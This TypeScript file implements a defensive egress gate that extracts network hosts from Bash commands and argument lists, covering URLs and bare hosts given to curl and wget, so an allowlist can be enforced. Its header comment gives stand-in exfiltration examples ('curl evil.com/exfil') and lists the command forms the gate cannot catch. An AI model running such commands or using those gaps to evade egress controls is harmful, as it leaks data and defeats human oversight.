/**
 * kit exec-broker — conservative network-target extraction.
 *
 * The egress-gate inspects a pending Bash
 * command for its network targets. Two passes, both deliberately CONSERVATIVE (a false positive
 * would wrongly deny legitimate work, so we only extract high-confidence targets):
 *
 *   1. Explicit `http(s)://` URLs, parsed via the WHATWG URL parser.
 *   2. Scheme-less hosts passed as the POSITIONAL argument to a known fetch tool (`curl` /
 *      `wget`) — e.g. `curl evil.com/exfil`, `wget evil.com`. curl/wget treat a bare positional
 *      as a URL, so it IS a real network target; without this pass the egress allowlist was not
 *      enforced for the most common egress form (a fail-open the bug sweep flagged). Value-taking
 *      flags (`-o out.txt`, `-H`, `-d @data.json`, …) are skipped so their arguments are never
 *      mistaken for hosts, and a token is only taken when it matches a strict domain shape.
 *
 * Still an HONEST LIMITATION, not a complete boundary: implicit-registry tools (`git`, `npm`,
 * `pip`), non-http(s) schemes, and variable-expanded URLs (`curl $HOST`) remain out of reach —
 * command-string inspection is defense-in-depth, pair it with a network sandbox for a hard
 * boundary. Pure + deterministic: same command → same hosts (unique, sorted).
 */

const URL_RE = /https?:\/\/[^\s"'`<>\\)\];]+/gi;

/** Tools whose bare positional argument is a URL/host even without a scheme. Registry/implicit-
 *  network tools (git/npm/pip/ssh/scp) are intentionally excluded — their targets are implicit
 *  and treating a bare arg as a host would over-block. */
const FETCH_TOOLS = new Set(["curl", "wget"]);

/** curl/wget flags that CONSUME the next token as a NON-host value, so it is never read as a
 *  network target (e.g. `curl -o out.txt host` must not extract `out.txt`). */
const CURL_VALUE_FLAGS = new Set([
  "-o",
  "--output",
  "-T",
  "--upload-file",
  "-d",
  "--data",
  "--data-raw",
  "--data-binary",
  "--data-urlencode",
  "-H",
  "--header",
  "-F",
  "--form",
  "-A",
  "--user-agent",
  "-e",
  "--referer",
  "-u",
  "--user",
  "-b",
  "--cookie",
  "-c",
  "--cookie-jar",
  "-w",
  "--write-out",
  "-E",
  "--cert",
  "--key",
  "--cacert",
  "-K",
  "--config",
  "-m",
  "--max-time",
  "--connect-timeout",
  "--retry",
]);

const WGET_VALUE_FLAGS = new Set([
  "-a",
  "--append-output",
  "-o",
  "--output-file",
  "-O",
  "--output-document",
  "-P",
  "--directory-prefix",
  "-U",
  "--user-agent",
  "-T",
  "--timeout",
  "-t",
  "--tries",
  "-w",
  "--wait",
  "-Q",
  "--quota",
  "-e",
  "--execute",
  "-i",
  "--input-file",
  "-l",
  "--level",
  "-D",
  "--domains",
  "-A",
  "--accept",
  "-R",
  "--reject",
  "-I",
  "--include-directories",
  "-X",
  "--exclude-directories",
  "--user",
  "--password",
  "--header",
  "--referer",
  "--post-data",
  "--post-file",
  "--body-data",
  "--body-file",
  "--method",
  "--certificate",
  "--private-key",
  "--ca-certificate",
  "--ca-directory",
  "--load-cookies",
  "--save-cookies",
]);

/** Strict domain shape: ≥2 dot-separated labels + an alpha TLD, optional :port and /path. A
 *  scheme (`x://…`) never matches — those are handled by URL_RE. */
const HOST_RE = /^(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,}(?::\d+)?(?:\/\S*)?$/i;

function takesValue(tool: string, flag: string): boolean {
  // curl -O selects the remote name. wget -O consumes an output filename.
  return (tool === "wget" ? WGET_VALUE_FLAGS : CURL_VALUE_FLAGS).has(flag);
}

/** basename of a command token (`/usr/bin/curl` → `curl`). */
function basename(tok: string): string {
  const i = tok.lastIndexOf("/");
  return i === -1 ? tok : tok.slice(i + 1);
}

/** Normalize a bare host token to a lowercase hostname via the URL parser, or null. */
function hostOf(token: string): string | null {
  if (!HOST_RE.test(token)) return null;
  try {
    const h = new URL("http://" + token).hostname;
    return h.length > 0 ? h.toLowerCase() : null;
  } catch {
    return null;
  }
}

/** Scheme-less hosts that are positional args to a curl/wget in the command (pass 2). */
function extractFetchHosts(command: string, hosts: Set<string>): void {
  // Split into command segments on shell separators so `curl a.com;echo` doesn't bleed.
  for (const segment of command.split(/&&|\|\||[;\n|&]/)) {
    const tokens = segment.trim().split(/\s+/).filter(Boolean);
    let fetchTool: string | undefined;
    let skipNext = false;
    for (const tok of tokens) {
      if (!fetchTool) {
        if (FETCH_TOOLS.has(basename(tok))) fetchTool = basename(tok);
        continue; // the tool token itself is never a host
      }
      if (skipNext) {
        skipNext = false;
        continue; // this is a value-flag's argument — not a host
      }
      if (tok.startsWith("-")) {
        // `--flag=value` carries its value inline (one token) — nothing to skip after it.
        if (takesValue(fetchTool, tok)) skipNext = true;
        continue;
      }
      const h = hostOf(tok);
      if (h) hosts.add(h);
    }
  }
}

/** Unique, sorted, lowercased hostnames of every network target in a shell command. */
export function extractHostsFromCommand(command: string): string[] {
  const hosts = new Set<string>();
  for (const match of command.match(URL_RE) ?? []) {
    try {
      const u = new URL(match);
      if (u.hostname) hosts.add(u.hostname.toLowerCase());
    } catch {
      /* not a parseable URL after all — skip (conservative: never guess) */
    }
  }
  extractFetchHosts(command, hosts);
  return [...hosts].sort();
}

/** Parse complete argument URLs before the fallback for embedded text. */
function extractArgumentUrls(arg: string, hosts: Set<string>): void {
  const start = arg.search(/https?:\/\//i);
  if (start < 0) return;
  try {
    // Complete argv values are URLs, not shell text. Keep IPv6 and userinfo intact.
    const host = new URL(arg.slice(start)).hostname;
    if (host) hosts.add(host.toLowerCase());
    return;
  } catch {
    // Embedded code or prose can contain URLs without being a URL itself.
  }
  for (const match of arg.match(URL_RE) ?? []) {
    try {
      const host = new URL(match).hostname;
      if (host) hosts.add(host.toLowerCase());
    } catch {
      // Ignore text that is not a URL.
    }
  }
}

/** Inspect the arguments that execute, independently of their display or shell quoting. */
export function extractHostsFromArgs(args: readonly string[]): string[] {
  const hosts = new Set<string>();
  for (const arg of args) extractArgumentUrls(arg, hosts);
  const tool = basename((args[0] ?? "").replaceAll("\\", "/")).replace(/\.exe$/i, "");
  if (FETCH_TOOLS.has(tool)) {
    let skipNext = false;
    for (const arg of args.slice(1)) {
      if (skipNext) {
        skipNext = false;
        continue;
      }
      if (arg.startsWith("-")) {
        skipNext = takesValue(tool, arg);
        continue;
      }
      const host = hostOf(arg);
      if (host) hosts.add(host);
    }
  }
  return [...hosts].sort();
}
